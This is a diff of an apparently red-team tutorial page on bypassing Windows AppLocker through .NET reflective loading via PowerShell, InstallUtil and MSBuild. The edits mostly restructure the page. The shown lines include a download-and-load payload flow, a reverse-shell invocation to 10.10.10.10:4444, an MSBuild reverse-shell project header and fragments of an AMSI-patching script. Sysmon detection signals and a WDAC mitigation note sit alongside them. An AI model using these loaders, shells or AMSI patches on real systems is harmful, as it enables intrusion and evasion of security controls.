@@ -1,11 +1,45 @@
 ---
 title: "AppLocker Bypass: Reflective Assembly Load"
-date: 2026-03-06
-description: "Bypassing AppLocker using .NET Assembly.Load() via PowerShell reflection, InstallUtil, and MSBuild inline tasks — with payload code, a Python DLL embedder, and Sysmon detection rules."
+date: 2026-05-21
+weight: 5
+reading_path: "applocker"
+step: 5
+description: "Bypassing AppLocker with .NET Assembly.Load() via PowerShell reflection, InstallUtil, and MSBuild inline tasks, including payload code and detection."
+verified: "Windows 10/11 Enterprise · May 2026"
 tags: ["applocker", "bypass", "assembly-load", "installutil", "msbuild", "dotnet", "evasion", "windows", "blueteam"]
 ---
 
 > **Scope:** Red team / authorized penetration testing. Techniques map to MITRE ATT&CK [T1218.004](https://attack.mitre.org/techniques/T1218/004/) (InstallUtil), [T1127.001](https://attack.mitre.org/techniques/T1127/001/) (MSBuild), and [T1620](https://attack.mitre.org/techniques/T1620/) (Reflective Code Loading).
+
+---
+
+## Why Does Reflective Loading Defeat AppLocker?
+
+AppLocker controls which executables and scripts can run. What it doesn't, and fundamentally can't, control is what .NET assemblies a trusted, whitelisted binary loads at runtime.
+
+The .NET CLR's `Assembly.Load()` method accepts raw bytes. Feed it a compiled assembly, and it executes inside the calling process, inheriting all of its trust. If that calling process is a Microsoft-signed binary that AppLocker considers sacred, the code you loaded never touches AppLocker's ruleset at all.
+
+This isn't a bug in the traditional sense. It's .NET working exactly as designed, and AppLocker never having been built to handle it.
+
+This post covers three independent vectors:
+
+| vector | binary abused | noise level |
+|--------|--------------|-------------|
+| Reflective load via PowerShell | `powershell.exe` | medium |
+| InstallUtil | `InstallUtil.exe` | low |
+| MSBuild inline tasks | `MSBuild.exe` | low |
+
+---
+
+## AppLocker Coverage Gap Diagram
+```mermaid
+flowchart TD
+    P["Process launch"] --> ENG{"AppLocker policy engine\nchecks path / publisher / hash\nscope: .exe .dll .ps1 .vbs .js .msi"}
+    ENG -->|"powershell.exe, InstallUtil.exe, MSBuild.exe\nsigned Microsoft"| ALLOW["ALLOW — trusted binary running"]
+    ALLOW --> CALL["[System.Reflection.Assembly]::Load($bytes)"]
+    CALL --> BLIND["Blind spot: AppLocker never sees this call.\nCLR loads bytes directly into process memory"]
+    BLIND --> RUN["Your payload runs inside the trusted process"]
+```
 
 ---
 
@@ -90,101 +124,20 @@ VM → Snapshot → "ASSEMBLYLOAD_BASELINE"
 
 ---
 
-## AppLocker Coverage Gap Diagram
-
-``` {linenos=inline}
-                    APPLOCKER EVALUATION MODEL
-┌───────────────────────────────────────────────────────────────┐
-│                                                               │
-│   Process Launch                                              │
-│        │                                                      │
-│        ▼                                                      │
-│   ┌─────────────────────────────────────────────────────┐    │
-│   │            AppLocker Policy Engine                  │    │
-│   │                                                     │    │
-│   │  Checks:  Binary path / publisher / hash            │    │
-│   │  Scope:   .exe  .dll  .ps1  .vbs  .js  .msi        │    │
-│   │                                                     │    │
-│   │  ✓ powershell.exe   → ALLOW (signed Microsoft)      │    │
-│   │  ✓ InstallUtil.exe  → ALLOW (signed Microsoft)      │    │
-│   │  ✓ MSBuild.exe      → ALLOW (signed Microsoft)      │    │
-│   └──────────────────────────┬──────────────────────────┘    │
-│                              │ ALLOWED                        │
-│                              ▼                                │
-│   ┌──────────────────────────────────────────────────────┐   │
-│   │           TRUSTED BINARY RUNNING                     │   │
-│   │                                                      │   │
-│   │  [System.Reflection.Assembly]::Load($bytes)          │   │
-│   │                    │                                 │   │
-│   │    AppLocker ───── X ──── BLIND SPOT                 │   │
-│   │    never sees      │      CLR loads bytes directly   │   │
-│   │    this call       │      into process address space │   │
-│   │                    ▼                                 │   │
-│   │            YOUR PAYLOAD RUNS                         │   │
-│   │        inside trusted process                        │   │
-│   └──────────────────────────────────────────────────────┘   │
-└───────────────────────────────────────────────────────────────┘
-```
-
----
-
 ## Execution Flow by Vector
 
-``` {linenos=inline}
-VECTOR 1: PowerShell Reflective Load
-─────────────────────────────────────────────────────────────────
- powershell.exe                    payload.dll (in memory)
-      │                                   ▲
-      │  $bytes = DownloadData(url)        │
-      │  [Assembly]::Load($bytes) ─────────┘
-      │  .GetType("Payload.Runner")
-      │  .GetMethod("Go").Invoke()
-      │
-      └─► code runs inside powershell.exe — AppLocker approved it
+All three vectors abuse a signed .NET binary to run your code, differing only in how the bytes get in:
 
-
-VECTOR 2: InstallUtil
-─────────────────────────────────────────────────────────────────
- InstallUtil.exe /U payload.dll
-      │
-      │  loads payload.dll
-      │  calls Installer.Uninstall()
-      │                │
-      └────────────────┴─► YOUR CODE — high trust, low noise
-
-
-VECTOR 3: MSBuild Inline Task
-─────────────────────────────────────────────────────────────────
- MSBuild.exe revshell.proj
-      │
-      │  CodeTaskFactory reads <Code Type="Class">
-      │  compiles C# inline via CodeDom
-      │  executes Task.Execute()
-      │                │
-      └────────────────┴─► YOUR CODE — no DLL on disk at all
+```mermaid
+graph TD
+    V1["Vector 1: powershell.exe\n$bytes = DownloadData(url)\n[Assembly]::Load($bytes).Invoke()"] --> R1["Code runs inside powershell.exe\n(AppLocker approved it)"]
+    V2["Vector 2: InstallUtil.exe /U payload.dll\nloads DLL, calls Installer.Uninstall()"] --> R2["Your code — high trust, low noise"]
+    V3["Vector 3: MSBuild.exe revshell.proj\nCodeTaskFactory compiles C# inline\nexecutes Task.Execute()"] --> R3["Your code — no DLL on disk at all"]
 ```
 
 ---
 
-## The Core Idea
-
-AppLocker controls which executables and scripts can run. What it doesn't, and fundamentally can't, control is what .NET assemblies a trusted, whitelisted binary loads at runtime.
-
-The .NET CLR's `Assembly.Load()` method accepts raw bytes. Feed it a compiled assembly, and it executes inside the calling process, inheriting all of its trust. If that calling process is a Microsoft-signed binary that AppLocker considers sacred, the code you loaded never touches AppLocker's ruleset at all.
-
-This isn't a bug in the traditional sense. It's .NET working exactly as designed, and AppLocker never having been built to handle it.
-
-This post covers three independent vectors:
-
-| vector | binary abused | noise level |
-|--------|--------------|-------------|
-| Reflective load via PowerShell | `powershell.exe` | medium |
-| InstallUtil | `InstallUtil.exe` | low |
-| MSBuild inline tasks | `MSBuild.exe` | low |
-
----
-
-## How Assembly.Load() Bypasses AppLocker
+## How Does Assembly.Load() Bypass AppLocker?
 
 When AppLocker evaluates a process, it checks the binary on disk against its rules: publisher, path, hash. That evaluation happens at process creation time.
 
@@ -349,7 +302,7 @@ dotnet build -c Release -o .
 
 ---
 
-## Vector 1 — Reflective Load via PowerShell
+## Vector 1: Reflective Load via PowerShell
 
 `powershell.exe` ships with full access to the .NET reflection API. `[System.Reflection.Assembly]::Load()` accepts a byte array, loads it into the current AppDomain, and gives you a handle to call into it. The assembly never touches disk.
 
@@ -397,7 +350,7 @@ $method.Invoke($null, [object[]]@("10.10.10.10", 4444))
 
 ---
 
-## Vector 2 — InstallUtil
+## Vector 2: InstallUtil
 
 `InstallUtil.exe` is a legitimate .NET utility for installing and uninstalling service components. It lives in the .NET Framework directory and is fully trusted by AppLocker default rules.
 
@@ -510,11 +463,11 @@ The process tree is clean: `InstallUtil.exe` runs, loads the assembly, executes 
 
 ---
 
-## Vector 3 — MSBuild Inline Tasks
+## Vector 3: MSBuild Inline Tasks
 
 `MSBuild.exe` can compile and execute C# code defined inline inside an `.xml` project file, with no precompiled DLL required. The compilation happens entirely in memory via `CodeTaskFactory`. AppLocker sees only the trusted `MSBuild.exe` binary.
 
-### Basic exec — inline C#
+### Basic exec: inline C#
 
 ```xml {linenos=inline}
 <!-- exec.proj -->
@@ -551,7 +504,7 @@ The process tree is clean: `InstallUtil.exe` runs, loads the assembly, executes 
 </Project>
 ```
 
-### Reverse shell — inline C#
+### Reverse shell: inline C#
 
 ```xml {linenos=inline}
 <!-- revshell.proj — update LHOST / LPORT -->
@@ -641,7 +594,7 @@ Or host it on WebDAV and reference it via UNC path. MSBuild resolves UNC paths n
 
 ---
 
-## Helper — DLL to Base64 Embedder
+## Helper: DLL to Base64 Embedder
 
 If you want to embed your payload DLL directly in the PowerShell loader (zero network traffic, zero disk touches):
 
@@ -729,7 +682,7 @@ For heavily restricted environments (no writable paths, constrained language mod
 
 ## AMSI Bypass for Assembly.Load()
 
-If AMSI is catching your DLL bytes, patch it out before loading. Pair this with your loader:
+If AMSI is catching your DLL bytes, [patch it out](/docs/redteam/bypass-amsi/) before loading. Pair this with your loader:
 
 ```powershell
 # amsi_patch.ps1 — patch AmsiScanBuffer to always return clean
@@ -764,7 +717,7 @@ $marshal::Copy($patch, 0, $ptr, $patch.Length)
 
 | signal | event / source |
 |--------|---------------|
-| `InstallUtil.exe` loading unsigned assemblies | Sysmon EID 7 — ImageLoad, check Signed field |
+| `InstallUtil.exe` loading unsigned assemblies | [Sysmon](/docs/blueteam/lolbins-hunting/) EID 7 — ImageLoad, check Signed field |
 | `MSBuild.exe` spawning network connections | Sysmon EID 3 — NetworkConnect |
 | `MSBuild.exe` or `InstallUtil.exe` spawning shells | Sysmon EID 1 — ProcessCreate, ParentImage |
 | PowerShell `Assembly.Load` with byte array | EID 4104 — ScriptBlock logging |
@@ -787,7 +740,7 @@ $marshal::Copy($patch, 0, $ptr, $patch.Length)
 </ProcessCreate>
 ```
 
-**Mitigation:** WDAC (Windows Defender Application Control) with script enforcement and ETW-based inspection covers most of these. AppLocker path/publisher rules alone won't cover these. These binaries are by definition trusted.
+**Mitigation:** WDAC ([Windows Defender](/docs/redteam/defender-bypass/) Application Control) with script enforcement and ETW-based inspection covers most of these. AppLocker path/publisher rules alone won't cover these. These binaries are by definition trusted.
 
 ---
 
